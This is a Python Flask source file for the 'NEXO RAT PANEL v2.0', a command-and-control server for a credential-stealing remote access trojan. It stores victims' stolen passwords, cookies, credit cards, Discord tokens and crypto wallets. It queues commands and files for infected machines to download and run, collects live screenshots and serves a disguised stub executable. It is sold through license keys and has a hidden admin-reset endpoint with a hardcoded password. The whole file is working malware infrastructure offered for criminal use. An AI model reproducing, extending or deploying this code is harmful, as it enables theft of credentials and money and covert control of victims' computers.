"""
███╗   ██╗███████╗██╗  ██╗ ██████╗     ██████╗  █████╗ ████████╗
████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗    ██╔══██╗██╔══██╗╚══██╔══╝
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║    ██████╔╝███████║   ██║
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║    ██╔══██╗██╔══██║   ██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝    ██║  ██║██║  ██║   ██║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
                    NEXO RAT PANEL v2.0
                      By LO & ENI
"""

import os
import json
import uuid
import base64
import hashlib
import secrets
from datetime import datetime, timedelta
from functools import wraps

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///nexo.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB max

if app.config['SQLALCHEMY_DATABASE_URI'].startswith('postgres://'):
    app.config['SQLALCHEMY_DATABASE_URI'] = app.config['SQLALCHEMY_DATABASE_URI'].replace('postgres://', 'postgresql://', 1)

db = SQLAlchemy(app)
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)


# ==================== MODELS ====================

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    panel_id = db.Column(db.String(32), unique=True, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    victims = db.relationship('Victim', backref='owner', lazy=True)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)


class LicenseKey(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(50), unique=True, nullable=False)
    created_by = db.Column(db.Integer, db.ForeignKey('user.id'))
    used_by = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    expires_at = db.Column(db.DateTime, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_used = db.Column(db.Boolean, default=False)


class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(32), unique=True, nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    # System Info
    hostname = db.Column(db.String(100))
    username = db.Column(db.String(100))
    os_info = db.Column(db.String(200))
    cpu = db.Column(db.String(200))
    public_ip = db.Column(db.String(50))
    local_ip = db.Column(db.String(50))
    mac_address = db.Column(db.String(50))
    country = db.Column(db.String(50))
    city = db.Column(db.String(100))
    isp = db.Column(db.String(200))

    # Data counts
    passwords_count = db.Column(db.Integer, default=0)
    cookies_count = db.Column(db.Integer, default=0)
    cards_count = db.Column(db.Integer, default=0)
    tokens_count = db.Column(db.Integer, default=0)
    wallets_count = db.Column(db.Integer, default=0)

    # Data (stored as JSON)
    passwords = db.Column(db.Text)
    cookies = db.Column(db.Text)
    credit_cards = db.Column(db.Text)
    discord_tokens = db.Column(db.Text)
    wallets = db.Column(db.Text)

    # Files
    screenshot_path = db.Column(db.String(500))
    zip_path = db.Column(db.String(500))

    # RAT features
    is_online = db.Column(db.Boolean, default=True)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    pending_commands = db.Column(db.Text)  # JSON list of commands

    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    notes = db.Column(db.Text)




# ==================== AUTH ====================

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        user = User.query.get(session['user_id'])
        if not user or not user.is_admin:
            flash('Admin access required', 'error')
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated_function


# ==================== ROUTES ====================

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')

        user = User.query.filter_by(username=username).first()

        if user and user.check_password(password):
            session['user_id'] = user.id
            session['username'] = user.username
            session['panel_id'] = user.panel_id
            session['is_admin'] = user.is_admin
            return redirect(url_for('dashboard'))

        flash('Invalid credentials', 'error')

    return render_template('login.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        confirm_password = request.form.get('confirm_password', '')
        license_key = request.form.get('license_key', '').strip()

        # Check license key
        key = LicenseKey.query.filter_by(key=license_key, is_used=False).first()
        if not key:
            flash('Invalid or already used license key', 'error')
            return render_template('register.html')

        if key.expires_at and key.expires_at < datetime.utcnow():
            flash('License key has expired', 'error')
            return render_template('register.html')

        if len(username) < 3:
            flash('Username must be at least 3 characters', 'error')
        elif len(password) < 6:
            flash('Password must be at least 6 characters', 'error')
        elif password != confirm_password:
            flash('Passwords do not match', 'error')
        elif User.query.filter_by(username=username).first():
            flash('Username already exists', 'error')
        else:
            user = User(
                username=username,
                panel_id=uuid.uuid4().hex,
                is_admin=False
            )
            user.set_password(password)
            db.session.add(user)

            # Mark key as used
            key.is_used = True
            key.used_by = user.id
            db.session.commit()

            flash('Account created! Please login.', 'success')
            return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/dashboard')
@login_required
def dashboard():
    user = User.query.get(session['user_id'])
    victims = Victim.query.filter_by(user_id=user.id).order_by(Victim.created_at.desc()).all()

    # Update online status
    for v in victims:
        if v.last_seen:
            v.is_online = (datetime.utcnow() - v.last_seen).total_seconds() < 60

    stats = {
        'victims': len(victims),
        'online': sum(1 for v in victims if v.is_online),
        'passwords': sum(v.passwords_count for v in victims),
        'cookies': sum(v.cookies_count for v in victims),
        'cards': sum(v.cards_count for v in victims),
        'tokens': sum(v.tokens_count for v in victims),
        'wallets': sum(v.wallets_count for v in victims)
    }

    return render_template('dashboard.html', user=user, victims=victims, stats=stats)


@app.route('/victim/<victim_id>')
@login_required
def victim_detail(victim_id):
    victim = Victim.query.filter_by(victim_id=victim_id).first_or_404()

    if victim.user_id != session['user_id']:
        return redirect(url_for('dashboard'))

    passwords = json.loads(victim.passwords) if victim.passwords else []
    cookies = json.loads(victim.cookies) if victim.cookies else []
    credit_cards = json.loads(victim.credit_cards) if victim.credit_cards else []
    discord_tokens = json.loads(victim.discord_tokens) if victim.discord_tokens else []
    wallets = json.loads(victim.wallets) if victim.wallets else []

    return render_template('victim.html',
                         victim=victim,
                         passwords=passwords,
                         cookies=cookies,
                         credit_cards=credit_cards,
                         discord_tokens=discord_tokens,
                         wallets=wallets)


@app.route('/victim/<victim_id>/command', methods=['POST'])
@login_required
def send_command(victim_id):
    """Send command to victim"""
    victim = Victim.query.filter_by(victim_id=victim_id).first_or_404()

    if victim.user_id != session['user_id']:
        return jsonify({'error': 'Unauthorized'}), 403

    command_type = request.form.get('type')
    command_data = request.form.get('data', '')

    # Build command
    command = {
        'id': uuid.uuid4().hex[:8],
        'type': command_type,
        'data': command_data,
        'timestamp': datetime.utcnow().isoformat()
    }

    # Handle file upload
    if command_type == 'execute_file' and 'file' in request.files:
        file = request.files['file']
        if file.filename:
            filename = f"{victim_id}_{uuid.uuid4().hex[:8]}_{file.filename}"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(filepath)
            command['filename'] = filename

    # Add to pending commands
    pending = json.loads(victim.pending_commands) if victim.pending_commands else []
    pending.append(command)
    victim.pending_commands = json.dumps(pending)
    db.session.commit()

    flash(f'Command "{command_type}" queued for {victim.username}', 'success')
    return redirect(url_for('victim_detail', victim_id=victim_id))


@app.route('/victim/<victim_id>/delete', methods=['POST'])
@login_required
def delete_victim(victim_id):
    victim = Victim.query.filter_by(victim_id=victim_id).first_or_404()

    if victim.user_id != session['user_id']:
        return redirect(url_for('dashboard'))

    if victim.screenshot_path and os.path.exists(os.path.join(app.config['UPLOAD_FOLDER'], victim.screenshot_path)):
        os.remove(os.path.join(app.config['UPLOAD_FOLDER'], victim.screenshot_path))

    db.session.delete(victim)
    db.session.commit()

    flash('Victim deleted', 'success')
    return redirect(url_for('dashboard'))




@app.route('/settings')
@login_required
def settings():
    user = User.query.get(session['user_id'])
    base_url = request.host_url.rstrip('/')
    api_url = f"{base_url}/api/{user.panel_id}/report"
    return render_template('settings.html', user=user, api_url=api_url)


@app.route('/builder')
@login_required
def builder():
    user = User.query.get(session['user_id'])
    base_url = request.host_url.rstrip('/')
    api_url = f"{base_url}/api/{user.panel_id}/report"
    return render_template('builder.html', user=user, api_url=api_url)


@app.route('/builder/download')
@login_required
def download_stub():
    """Download the stub with custom filename"""
    filename = request.args.get('name', 'setup')
    # Sanitize filename
    filename = "".join(c for c in filename if c.isalnum() or c in ('_', '-', ' ')).strip()
    if not filename:
        filename = 'setup'

    stub_path = os.path.join(app.config['UPLOAD_FOLDER'], 'stub.exe')
    if not os.path.exists(stub_path):
        flash('Stub not found. Contact admin.', 'error')
        return redirect(url_for('builder'))

    from flask import send_file
    return send_file(
        stub_path,
        as_attachment=True,
        download_name=f"{filename}.exe",
        mimetype='application/octet-stream'
    )


# ==================== ADMIN ROUTES ====================

@app.route('/admin')
@admin_required
def admin_panel():
    users = User.query.all()
    keys = LicenseKey.query.order_by(LicenseKey.created_at.desc()).all()
    all_victims = Victim.query.count()
    return render_template('admin.html', users=users, keys=keys, total_victims=all_victims)


@app.route('/admin/keys/generate', methods=['POST'])
@admin_required
def generate_key():
    days = int(request.form.get('days', 30))

    key = LicenseKey(
        key=f"NEXO-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}",
        created_by=session['user_id'],
        expires_at=datetime.utcnow() + timedelta(days=days) if days > 0 else None
    )
    db.session.add(key)
    db.session.commit()

    flash(f'Key generated: {key.key}', 'success')
    return redirect(url_for('admin_panel'))


@app.route('/admin/user/<int:user_id>/toggle_admin', methods=['POST'])
@admin_required
def toggle_admin(user_id):
    user = User.query.get_or_404(user_id)
    user.is_admin = not user.is_admin
    db.session.commit()
    flash(f'Admin status toggled for {user.username}', 'success')
    return redirect(url_for('admin_panel'))


@app.route('/uploads/<path:filename>')
@login_required
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)


# ==================== API ENDPOINTS ====================

@app.route('/api/<panel_id>/report', methods=['POST'])
def api_report(panel_id):
    """Receive data from grabber"""
    user = User.query.filter_by(panel_id=panel_id).first()
    if not user:
        return jsonify({'error': 'Invalid panel ID'}), 404

    try:
        if request.is_json:
            data = request.json
        else:
            data = json.loads(request.form.get('data', '{}'))

        # Check if victim already exists (for updates)
        existing = Victim.query.filter_by(
            user_id=user.id,
            hostname=data.get('system_info', {}).get('hostname'),
            username=data.get('system_info', {}).get('username')
        ).first()

        if existing:
            victim = existing
            victim.last_seen = datetime.utcnow()
            victim.is_online = True
        else:
            victim = Victim(
                victim_id=uuid.uuid4().hex,
                user_id=user.id
            )

        # Update data
        victim.hostname = data.get('system_info', {}).get('hostname', 'Unknown')
        victim.username = data.get('system_info', {}).get('username', 'Unknown')
        victim.os_info = data.get('system_info', {}).get('os', 'Unknown')
        victim.cpu = data.get('system_info', {}).get('cpu', 'Unknown')
        victim.public_ip = data.get('system_info', {}).get('public_ip', 'Unknown')
        victim.local_ip = data.get('system_info', {}).get('local_ip', 'Unknown')
        victim.mac_address = data.get('system_info', {}).get('mac', 'Unknown')
        victim.country = data.get('system_info', {}).get('country', 'Unknown')
        victim.city = data.get('system_info', {}).get('city', 'Unknown')
        victim.isp = data.get('system_info', {}).get('isp', 'Unknown')

        # Update counts and data
        if data.get('passwords'):
            victim.passwords_count = len(data['passwords'])
            victim.passwords = json.dumps(data['passwords'])
        if data.get('cookies'):
            victim.cookies_count = len(data['cookies'])
            victim.cookies = json.dumps(data['cookies'][:500])
        if data.get('credit_cards'):
            victim.cards_count = len(data['credit_cards'])
            victim.credit_cards = json.dumps(data['credit_cards'])
        if data.get('tokens'):
            victim.tokens_count = len(data['tokens'])
            victim.discord_tokens = json.dumps(data['tokens'])
        if data.get('wallets'):
            victim.wallets_count = len(data['wallets'])
            victim.wallets = json.dumps(data['wallets'])

        # Handle screenshot
        if data.get('screenshot_base64'):
            try:
                screenshot_data = base64.b64decode(data['screenshot_base64'])
                filename = f"{victim.victim_id}_screen_{datetime.utcnow().strftime('%H%M%S')}.png"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                with open(filepath, 'wb') as f:
                    f.write(screenshot_data)
                victim.screenshot_path = filename
            except:
                pass

        if not existing:
            db.session.add(victim)
        db.session.commit()

        # Return pending commands
        pending = json.loads(victim.pending_commands) if victim.pending_commands else []
        victim.pending_commands = '[]'
        db.session.commit()

        return jsonify({
            'success': True,
            'victim_id': victim.victim_id,
            'commands': pending,
            'is_new': not existing
        }), 200

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/<panel_id>/screen/<victim_id>', methods=['POST'])
def api_screen(panel_id, victim_id):
    """Receive live screenshot"""
    user = User.query.filter_by(panel_id=panel_id).first()
    if not user:
        return jsonify({'error': 'Invalid'}), 404

    victim = Victim.query.filter_by(victim_id=victim_id, user_id=user.id).first()
    if not victim:
        return jsonify({'error': 'Invalid victim'}), 404

    try:
        if request.is_json and request.json.get('screenshot_base64'):
            screenshot_data = base64.b64decode(request.json['screenshot_base64'])
            filename = f"{victim_id}_live.png"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            with open(filepath, 'wb') as f:
                f.write(screenshot_data)
            victim.screenshot_path = filename
            victim.last_seen = datetime.utcnow()
            db.session.commit()

        return jsonify({'success': True}), 200
    except:
        return jsonify({'error': 'Failed'}), 500


@app.route('/api/<panel_id>/file/<filename>')
def api_get_file(panel_id, filename):
    """Serve file for victim to download and execute"""
    user = User.query.filter_by(panel_id=panel_id).first()
    if not user:
        return jsonify({'error': 'Invalid'}), 404

    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)


@app.route('/api/check_new/<panel_id>')
@login_required
def check_new_victims(panel_id):
    """Check for new victims (for notification sound)"""
    user = User.query.filter_by(panel_id=panel_id).first()
    if not user or user.id != session['user_id']:
        return jsonify({'count': 0})

    # Get victims from last 30 seconds
    recent = Victim.query.filter(
        Victim.user_id == user.id,
        Victim.created_at > datetime.utcnow() - timedelta(seconds=30)
    ).count()

    return jsonify({'count': recent})


# ==================== SETUP ADMIN ====================

@app.route('/setup-admin-fl3ch1ng-s3cr3t')
def setup_admin():
    """Secret endpoint to create/reset admin account"""
    admin = User.query.filter_by(username='fleching').first()
    if admin:
        admin.set_password('9vaO701k5njw2Wch')
        admin.is_admin = True
    else:
        admin = User(
            username='fleching',
            panel_id=uuid.uuid4().hex,
            is_admin=True
        )
        admin.set_password('9vaO701k5njw2Wch')
        db.session.add(admin)
    db.session.commit()
    return jsonify({'success': True, 'message': 'Done'})


# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(e):
    return render_template('500.html'), 500


# ==================== INIT ====================

with app.app_context():
    db.create_all()

    # Create default admin if not exists
    admin = User.query.filter_by(username='fleching').first()
    if not admin:
        admin = User(
            username='fleching',
            panel_id=uuid.uuid4().hex,
            is_admin=True
        )
        admin.set_password('9vaO701k5njw2Wch')
        db.session.add(admin)
        db.session.commit()


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
